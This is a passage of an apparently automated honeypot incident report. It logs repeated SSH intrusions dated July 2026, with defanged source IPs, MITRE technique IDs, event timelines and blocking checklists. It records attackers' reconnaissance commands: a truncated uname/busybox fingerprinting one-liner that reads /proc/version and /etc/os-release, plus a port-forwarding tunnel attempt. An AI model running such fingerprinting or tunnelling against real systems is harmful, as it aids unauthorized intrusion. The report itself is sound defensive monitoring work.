| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:13:33` | `cowrie.session.connect` |
| `2026-07-06 04:13:34` | `cowrie.client.version` |
| `2026-07-06 04:13:34` | `cowrie.client.kex` |
| `2026-07-06 04:13:37` | `cowrie.login.success` |
| `2026-07-06 04:13:39` | `cowrie.session.params` |
| `2026-07-06 04:13:39` | `cowrie.command.input` |
| `2026-07-06 04:13:39` | `cowrie.command.input` |
| `2026-07-06 04:13:39` | `cowrie.command.input` |
| `2026-07-06 04:13:39` | `cowrie.command.input` |
| `2026-07-06 04:13:39` | `cowrie.command.input` |
| `2026-07-06 04:13:39` | `cowrie.command.success` |
| `2026-07-06 04:13:39` | `cowrie.command.input` |
| `2026-07-06 04:13:39` | `cowrie.command.input` |
| `2026-07-06 04:13:39` | `cowrie.command.input` |
| `2026-07-06 04:13:39` | `cowrie.command.input` |
| `2026-07-06 04:13:40` | `cowrie.log.closed` |
| `2026-07-06 04:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77250cba3491

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:14 |
| **Last Seen** | 2026-07-06 04:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:14:25` | `cowrie.session.connect` |
| `2026-07-06 04:14:26` | `cowrie.client.version` |
| `2026-07-06 04:14:26` | `cowrie.client.kex` |
| `2026-07-06 04:14:29` | `cowrie.login.success` |
| `2026-07-06 04:14:31` | `cowrie.session.params` |
| `2026-07-06 04:14:31` | `cowrie.command.input` |
| `2026-07-06 04:14:31` | `cowrie.command.input` |
| `2026-07-06 04:14:31` | `cowrie.command.input` |
| `2026-07-06 04:14:31` | `cowrie.command.input` |
| `2026-07-06 04:14:31` | `cowrie.command.input` |
| `2026-07-06 04:14:31` | `cowrie.command.success` |
| `2026-07-06 04:14:31` | `cowrie.command.input` |
| `2026-07-06 04:14:31` | `cowrie.command.input` |
| `2026-07-06 04:14:31` | `cowrie.command.input` |
| `2026-07-06 04:14:31` | `cowrie.command.input` |
| `2026-07-06 04:14:32` | `cowrie.log.closed` |
| `2026-07-06 04:14:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4983e7599aa6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 04:14 |
| **Last Seen** | 2026-07-06 04:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:14:43` | `cowrie.session.connect` |
| `2026-07-06 04:14:43` | `cowrie.client.version` |
| `2026-07-06 04:14:43` | `cowrie.client.kex` |
| `2026-07-06 04:14:44` | `cowrie.login.success` |
| `2026-07-06 04:14:44` | `cowrie.direct-tcpip.request` |
| `2026-07-06 04:14:44` | `cowrie.direct-tcpip.data` |
| `2026-07-06 04:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d1c30a503ed

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:15 |
| **Last Seen** | 2026-07-06 04:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:15:17` | `cowrie.session.connect` |
| `2026-07-06 04:15:17` | `cowrie.client.version` |
| `2026-07-06 04:15:17` | `cowrie.client.kex` |
| `2026-07-06 04:15:21` | `cowrie.login.success` |
| `2026-07-06 04:15:23` | `cowrie.session.params` |
| `2026-07-06 04:15:23` | `cowrie.command.input` |
| `2026-07-06 04:15:23` | `cowrie.command.input` |
| `2026-07-06 04:15:23` | `cowrie.command.input` |
| `2026-07-06 04:15:23` | `cowrie.command.input` |
| `2026-07-06 04:15:23` | `cowrie.command.input` |
| `2026-07-06 04:15:23` | `cowrie.command.success` |
| `2026-07-06 04:15:23` | `cowrie.command.input` |
| `2026-07-06 04:15:23` | `cowrie.command.input` |
| `2026-07-06 04:15:23` | `cowrie.command.input` |
| `2026-07-06 04:15:23` | `cowrie.command.input` |
| `2026-07-06 04:15:24` | `cowrie.log.closed` |
| `2026-07-06 04:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fb6ff8cc04b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:16 |
| **Last Seen** | 2026-07-06 04:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:16:08` | `cowrie.session.connect` |
| `2026-07-06 04:16:09` | `cowrie.client.version` |
| `2026-07-06 04:16:09` | `cowrie.client.kex` |
| `2026-07-06 04:16:12` | `cowrie.login.success` |
| `2026-07-06 04:16:14` | `cowrie.session.params` |
| `2026-07-06 04:16:14` | `cowrie.command.input` |
| `2026-07-06 04:16:14` | `cowrie.command.input` |
| `2026-07-06 04:16:14` | `cowrie.command.input` |
| `2026-07-06 04:16:14` | `cowrie.command.input` |
| `2026-07-06 04:16:14` | `cowrie.command.input` |
| `2026-07-06 04:16:14` | `cowrie.command.success` |
| `2026-07-06 04:16:14` | `cowrie.command.input` |
| `2026-07-06 04:16:14` | `cowrie.command.input` |
| `2026-07-06 04:16:14` | `cowrie.command.input` |
| `2026-07-06 04:16:14` | `cowrie.command.input` |
| `2026-07-06 04:16:15` | `cowrie.log.closed` |
| `2026-07-06 04:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd378582a5ff

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:16 |
| **Last Seen** | 2026-07-06 04:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:16:42` | `cowrie.session.connect` |
| `2026-07-06 04:16:42` | `cowrie.client.version` |
| `2026-07-06 04:16:42` | `cowrie.client.kex` |
| `2026-07-06 04:16:43` | `cowrie.login.success` |
| `2026-07-06 04:16:44` | `cowrie.session.params` |
| `2026-07-06 04:16:44` | `cowrie.command.input` |
| `2026-07-06 04:16:44` | `cowrie.log.closed` |
| `2026-07-06 04:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5d105c57771

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 04:16 |
| **Last Seen** | 2026-07-06 04:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:16:57` | `cowrie.session.connect` |
| `2026-07-06 04:16:58` | `cowrie.client.version` |
| `2026-07-06 04:16:58` | `cowrie.client.kex` |
| `2026-07-06 04:17:04` | `cowrie.login.success` |
| `2026-07-06 04:17:07` | `cowrie.session.params` |
| `2026-07-06 04:17:07` | `cowrie.command.input` |
| `2026-07-06 04:17:08` | `cowrie.log.closed` |
| `2026-07-06 04:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-155c7338eed9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:16 |
| **Last Seen** | 2026-07-06 04:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:16:59` | `cowrie.session.connect` |
| `2026-07-06 04:17:00` | `cowrie.client.version` |
| `2026-07-06 04:17:00` | `cowrie.client.kex` |
| `2026-07-06 04:17:03` | `cowrie.login.success` |
| `2026-07-06 04:17:05` | `cowrie.session.params` |
| `2026-07-06 04:17:05` | `cowrie.command.input` |
| `2026-07-06 04:17:05` | `cowrie.command.input` |
| `2026-07-06 04:17:05` | `cowrie.command.input` |
| `2026-07-06 04:17:05` | `cowrie.command.input` |
| `2026-07-06 04:17:05` | `cowrie.command.input` |
| `2026-07-06 04:17:05` | `cowrie.command.success` |
| `2026-07-06 04:17:05` | `cowrie.command.input` |
| `2026-07-06 04:17:05` | `cowrie.command.input` |
| `2026-07-06 04:17:05` | `cowrie.command.input` |
| `2026-07-06 04:17:05` | `cowrie.command.input` |
| `2026-07-06 04:17:06` | `cowrie.log.closed` |
| `2026-07-06 04:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-987e7506823b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:17 |
| **Last Seen** | 2026-07-06 04:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:17:51` | `cowrie.session.connect` |
| `2026-07-06 04:17:52` | `cowrie.client.version` |
| `2026-07-06 04:17:52` | `cowrie.client.kex` |
| `2026-07-06 04:17:55` | `cowrie.login.success` |
| `2026-07-06 04:17:57` | `cowrie.session.params` |
| `2026-07-06 04:17:57` | `cowrie.command.input` |
| `2026-07-06 04:17:57` | `cowrie.command.input` |
| `2026-07-06 04:17:57` | `cowrie.command.input` |
| `2026-07-06 04:17:57` | `cowrie.command.input` |
| `2026-07-06 04:17:57` | `cowrie.command.input` |
| `2026-07-06 04:17:57` | `cowrie.command.success` |
| `2026-07-06 04:17:57` | `cowrie.command.input` |
| `2026-07-06 04:17:57` | `cowrie.command.input` |
| `2026-07-06 04:17:57` | `cowrie.command.input` |
| `2026-07-06 04:17:57` | `cowrie.command.input` |
| `2026-07-06 04:17:58` | `cowrie.log.closed` |
| `2026-07-06 04:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-998926aaa527

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:18 |
| **Last Seen** | 2026-07-06 04:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:18:39` | `cowrie.session.connect` |
| `2026-07-06 04:18:39` | `cowrie.client.version` |
| `2026-07-06 04:18:40` | `cowrie.client.kex` |
| `2026-07-06 04:18:40` | `cowrie.login.success` |
| `2026-07-06 04:18:41` | `cowrie.session.params` |
| `2026-07-06 04:18:41` | `cowrie.command.input` |
| `2026-07-06 04:18:41` | `cowrie.log.closed` |
| `2026-07-06 04:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d334440dedc5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:18 |
| **Last Seen** | 2026-07-06 04:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:18:43` | `cowrie.session.connect` |
| `2026-07-06 04:18:43` | `cowrie.client.version` |
| `2026-07-06 04:18:43` | `cowrie.client.kex` |
| `2026-07-06 04:18:47` | `cowrie.login.success` |
| `2026-07-06 04:18:49` | `cowrie.session.params` |
| `2026-07-06 04:18:49` | `cowrie.command.input` |
| `2026-07-06 04:18:49` | `cowrie.command.input` |
| `2026-07-06 04:18:49` | `cowrie.command.input` |
| `2026-07-06 04:18:49` | `cowrie.command.input` |
| `2026-07-06 04:18:49` | `cowrie.command.input` |
| `2026-07-06 04:18:49` | `cowrie.command.success` |
| `2026-07-06 04:18:49` | `cowrie.command.input` |
| `2026-07-06 04:18:49` | `cowrie.command.input` |
| `2026-07-06 04:18:49` | `cowrie.command.input` |
| `2026-07-06 04:18:49` | `cowrie.command.input` |
| `2026-07-06 04:18:50` | `cowrie.log.closed` |
| `2026-07-06 04:18:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2bcd8589886

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:19 |
| **Last Seen** | 2026-07-06 04:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:19:36` | `cowrie.session.connect` |
| `2026-07-06 04:19:37` | `cowrie.client.version` |
| `2026-07-06 04:19:37` | `cowrie.client.kex` |
| `2026-07-06 04:19:40` | `cowrie.login.success` |
| `2026-07-06 04:19:43` | `cowrie.session.params` |
| `2026-07-06 04:19:43` | `cowrie.command.input` |
| `2026-07-06 04:19:43` | `cowrie.command.input` |
| `2026-07-06 04:19:43` | `cowrie.command.input` |
| `2026-07-06 04:19:43` | `cowrie.command.input` |
| `2026-07-06 04:19:43` | `cowrie.command.input` |
| `2026-07-06 04:19:43` | `cowrie.command.success` |
| `2026-07-06 04:19:43` | `cowrie.command.input` |
| `2026-07-06 04:19:43` | `cowrie.command.input` |
| `2026-07-06 04:19:43` | `cowrie.command.input` |
| `2026-07-06 04:19:43` | `cowrie.command.input` |
| `2026-07-06 04:19:44` | `cowrie.log.closed` |
| `2026-07-06 04:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60a23f7d8a12

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:20 |
| **Last Seen** | 2026-07-06 04:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:20:29` | `cowrie.session.connect` |
| `2026-07-06 04:20:30` | `cowrie.client.version` |
| `2026-07-06 04:20:30` | `cowrie.client.kex` |
| `2026-07-06 04:20:33` | `cowrie.login.success` |
| `2026-07-06 04:20:35` | `cowrie.session.params` |
| `2026-07-06 04:20:35` | `cowrie.command.input` |
| `2026-07-06 04:20:35` | `cowrie.command.input` |
| `2026-07-06 04:20:35` | `cowrie.command.input` |
| `2026-07-06 04:20:35` | `cowrie.command.input` |
| `2026-07-06 04:20:35` | `cowrie.command.input` |
| `2026-07-06 04:20:35` | `cowrie.command.success` |
| `2026-07-06 04:20:35` | `cowrie.command.input` |
| `2026-07-06 04:20:35` | `cowrie.command.input` |
| `2026-07-06 04:20:35` | `cowrie.command.input` |
| `2026-07-06 04:20:35` | `cowrie.command.input` |
| `2026-07-06 04:20:35` | `cowrie.log.closed` |
| `2026-07-06 04:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-730e44f77f35

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:20 |
| **Last Seen** | 2026-07-06 04:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:20:39` | `cowrie.session.connect` |
| `2026-07-06 04:20:39` | `cowrie.client.version` |
| `2026-07-06 04:20:40` | `cowrie.client.kex` |
| `2026-07-06 04:20:40` | `cowrie.login.success` |
| `2026-07-06 04:20:41` | `cowrie.session.params` |
| `2026-07-06 04:20:41` | `cowrie.command.input` |
| `2026-07-06 04:20:41` | `cowrie.log.closed` |
| `2026-07-06 04:20:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c2e64fc802e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:21 |
| **Last Seen** | 2026-07-06 04:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:21:21` | `cowrie.session.connect` |
| `2026-07-06 04:21:22` | `cowrie.client.version` |
| `2026-07-06 04:21:22` | `cowrie.client.kex` |
| `2026-07-06 04:21:25` | `cowrie.login.success` |
| `2026-07-06 04:21:27` | `cowrie.session.params` |
| `2026-07-06 04:21:27` | `cowrie.command.input` |
| `2026-07-06 04:21:27` | `cowrie.command.input` |
| `2026-07-06 04:21:27` | `cowrie.command.input` |
| `2026-07-06 04:21:27` | `cowrie.command.input` |
| `2026-07-06 04:21:27` | `cowrie.command.input` |
| `2026-07-06 04:21:27` | `cowrie.command.success` |
| `2026-07-06 04:21:27` | `cowrie.command.input` |
| `2026-07-06 04:21:27` | `cowrie.command.input` |
| `2026-07-06 04:21:27` | `cowrie.command.input` |
